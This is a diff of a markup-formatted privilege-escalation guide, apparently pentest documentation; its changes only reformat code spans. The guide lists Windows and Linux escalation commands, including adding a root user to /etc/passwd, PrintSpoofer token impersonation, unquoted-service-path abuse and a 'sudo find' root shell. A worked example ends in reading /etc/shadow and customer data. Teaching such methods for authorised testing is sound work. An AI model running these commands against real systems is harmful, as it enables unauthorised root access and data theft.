@@ -70,8 +70,8 @@
 \li{\code{\startverb whoami /priv\stopverb} - Current user privileges (look for SeImpersonatePrivilege, SeDebugPrivilege)}
 \li{\code{\startverb systeminfo\stopverb} - OS version, hotfix level, architecture}
 \li{\code{\startverb wmic service get name,pathname,startmode\stopverb} - Unquoted service paths}
-\li{\code{\startverb icacls "C:\startverb \Program\stopverb Files" /T\stopverb} - Writable directories in Program Files}
-\li{\code{\startverb reg query HKLM\startverb \SOFTWARE\stopverb\startverb \Policies\stopverb\startverb \Microsoft\stopverb\startverb \Windows\stopverb\startverb \Installer\stopverb /v AlwaysInstallElevated\stopverb} - AlwaysInstallElevated check}
+\li{\startverb `icacls "C:\Program Files" /T` - Writable directories in Program Files\stopverb}
+\li{\startverb `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` - AlwaysInstallElevated check\stopverb}
 \li{\code{\startverb cmdkey /list\stopverb} - Stored Windows credentials}
 \li{\code{\startverb schtasks /query /fo LIST /v\stopverb} - Scheduled tasks with their run-as accounts}
 \li{Run \code{\startverb winPEAS.exe\stopverb} for automated comprehensive enumeration}
@@ -97,7 +97,7 @@
 \li{DirtyCow (CVE-2016-5195): Linux kernel 2.6.22-4.8.3}
 \li{PwnKit (CVE-2021-4034): Polkit pkexec vulnerability affecting most Linux distributions}
 \li{\strong{Capabilities abuse}: \code{\startverb getcap -r / 2>/dev/null\stopverb} to find binaries with elevated capabilities (cap_setuid, cap_dac_override)}
-\li{\strong{Writable /etc/passwd}: If /etc/passwd is writable, add a new root user: \code{\startverb echo 'newroot:$1$hash:0:0::/root:/bin/bash' >> /etc/passwd\stopverb}}
+\li{\startverb **Writable /etc/passwd**: If /etc/passwd is writable, add a new root user: `echo 'newroot:$1$hash:0:0::/root:/bin/bash' >> /etc/passwd`\stopverb}
 }
 }
 
@@ -108,9 +108,9 @@
 \ul{
 \li{\strong{Token impersonation}: If the user has \code{\startverb SeImpersonatePrivilege\stopverb} (common for service accounts and IIS):}
 \li{Use \code{\startverb JuicyPotato.exe\stopverb}, \code{\startverb PrintSpoofer.exe\stopverb}, or \code{\startverb GodPotato.exe\stopverb} to impersonate SYSTEM}
-\li{\code{\startverb PrintSpoofer.exe -i -c "cmd /c whoami"\stopverb} -> \code{\startverb NT AUTHORITY\startverb \SYSTEM\stopverb\stopverb}}
-\li{\strong{Unquoted service paths}: If a service has an unquoted path with spaces (e.g., \code{\startverb C:\startverb \Program\stopverb Files\startverb \My\stopverb App\startverb \service\stopverb.exe\stopverb}) and you can write to an intermediate directory:}
-\li{Place a malicious executable at \code{\startverb C:\startverb \Program\stopverb Files\startverb \My\stopverb.exe\stopverb} which will execute when the service restarts}
+\li{\startverb `PrintSpoofer.exe -i -c "cmd /c whoami"` -> `NT AUTHORITY\SYSTEM`\stopverb}
+\li{\startverb **Unquoted service paths**: If a service has an unquoted path with spaces (e.g., `C:\Program Files\My App\service.exe`) and you can write to an intermediate directory:\stopverb}
+\li{\startverb Place a malicious executable at `C:\Program Files\My.exe` which will execute when the service restarts\stopverb}
 \li{\strong{Writable service binaries}: If you can modify the executable of a service running as SYSTEM:}
 \li{Replace the binary with a reverse shell and restart the service}
 \li{\strong{AlwaysInstallElevated}: If both HKLM and HKCU AlwaysInstallElevated registry keys are set to 1:}
@@ -184,7 +184,7 @@
 \ol{
 \li{Run \code{\startverb linpeas.sh\stopverb} which identifies that \code{\startverb www-data\stopverb} can run \code{\startverb /usr/bin/find\stopverb} as root via sudo without a password}
 \li{Verify with \code{\startverb sudo -l\stopverb}: \code{\startverb (root) NOPASSWD: /usr/bin/find\stopverb}}
-\li{Consult GTFOBins for the \code{\startverb find\stopverb} sudo entry: \code{\startverb sudo find . -exec /bin/bash -p \; -quit\stopverb}}
+\li{\startverb Consult GTFOBins for the `find` sudo entry: `sudo find . -exec /bin/bash -p \; -quit`\stopverb}
 \li{Execute the command and obtain a root shell}
 \li{As root, access \code{\startverb /etc/shadow\stopverb} to extract password hashes, read database credentials from the application configuration, and access the MySQL database containing customer PII}
 \li{Document: initial access as www-data -> sudo misconfiguration -> root shell -> database access -> 75,000 customer records accessible}
